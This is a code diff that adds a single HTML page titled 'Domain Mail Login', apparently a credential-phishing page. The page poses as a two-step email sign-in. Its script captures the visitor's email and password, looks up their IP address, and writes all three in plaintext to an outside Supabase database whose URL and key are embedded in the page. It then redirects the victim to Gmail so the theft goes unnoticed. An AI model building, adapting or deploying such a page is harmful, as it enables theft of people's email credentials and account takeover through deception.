@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Domain Mail Login</title>
+    
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
+    <style>
+        /* Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #4a90e2, #9013fe);
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 40px 30px;
+            border-radius: 12px;
+            width: 350px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .login-container h1 {
+            margin-bottom: 20px;
+            color: #333;
+            font-size: 24px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 12px 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+
+        .login-container input:focus {
+            outline: none;
+            border-color: #4a90e2;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            background-color: #4a90e2;
+            color: #fff;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .login-container button:hover {
+            background-color: #357abd;
+        }
+
+        .login-container button:disabled {
+            background-color: #999;
+            cursor: not-allowed;
+        }
+
+        .password-section {
+            display: none;
+        }
+
+        .back-btn {
+            background-color: transparent;
+            color: #4a90e2;
+            border: none;
+            cursor: pointer;
+            margin-bottom: 10px;
+            font-size: 14px;
+            width: auto;
+            padding: 5px 10px;
+            margin-top: 0;
+        }
+
+        .back-btn:hover {
+            text-decoration: underline;
+            background-color: transparent;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h1>Domain Mail Login</h1>
+
+    <!-- Email Section -->
+    <div class="email-section">
+        <input type="email" id="email" placeholder="Enter your email" required>
+        <button id="nextBtn">Next</button>
+    </div>
+
+    <!-- Password Section -->
+    <div class="password-section">
+        <button class="back-btn" id="backBtn">← Back</button>
+        <input type="password" id="password" placeholder="Enter your password" required>
+        <button id="loginBtn">Login</button>
+    </div>
+</div>
+
+<script>
+// Supabase configuration
+const supabaseUrl = 'https://tbdeofcwnqfaipkwbwvw.supabase.co';
+const supabaseKey = 'sb_publishable_qp6gYArW7JNkXwHpob8YuQ_9W0WNoYC';
+const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);
+
+// Get DOM elements
+const nextBtn = document.getElementById('nextBtn');
+const backBtn = document.getElementById('backBtn');
+const loginBtn = document.getElementById('loginBtn');
+const emailSection = document.querySelector('.email-section');
+const passwordSection = document.querySelector('.password-section');
+const emailInput = document.getElementById('email');
+const passwordInput = document.getElementById('password');
+
+// Store email
+let userEmail = "";
+
+// Next button click - shows password section when email is entered
+nextBtn.addEventListener('click', () => {
+    const email = emailInput.value;
+    if(email.trim() !== "") {
+        userEmail = email;
+        emailSection.style.display = 'none';
+        passwordSection.style.display = 'block';
+    } else {
+        alert("Please enter your email.");
+    }
+});
+
+// Back button click - returns to email section
+backBtn.addEventListener('click', () => {
+    passwordSection.style.display = 'none';
+    emailSection.style.display = 'block';
+});
+
+// Login button click - saves to Supabase and redirects
+loginBtn.addEventListener('click', async () => {
+    const email = userEmail;
+    const password = passwordInput.value;
+    
+    if(password.trim() === "") {
+        alert("Please enter your password.");
+        return;
+    }
+    
+    // Change button text
+    loginBtn.innerHTML = 'SIGNING IN...';
+    loginBtn.disabled = true;
+    
+    // Get IP address
+    let ipAddress = "Not available";
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        ipAddress = ipData.ip;
+    } catch(e) {
+        // Ignore IP errors
+    }
+    
+    // Save to Supabase
+    const { error } = await supabaseClient
+        .from('domain_logins')
+        .insert([
+            { 
+                email: email,
+                password: password,
+                ip_address: ipAddress,
+                location: "Domain Mail Login"
+            }
+        ]);
+    
+    if (error) {
+        alert("Error: " + error.message);
+        loginBtn.innerHTML = 'Login';
+        loginBtn.disabled = false;
+    } else {
+        // Redirect to Gmail
+        window.location.href = "https://mail.google.com/";
+    }
+});
+</script>
+
+</body>
+</html>
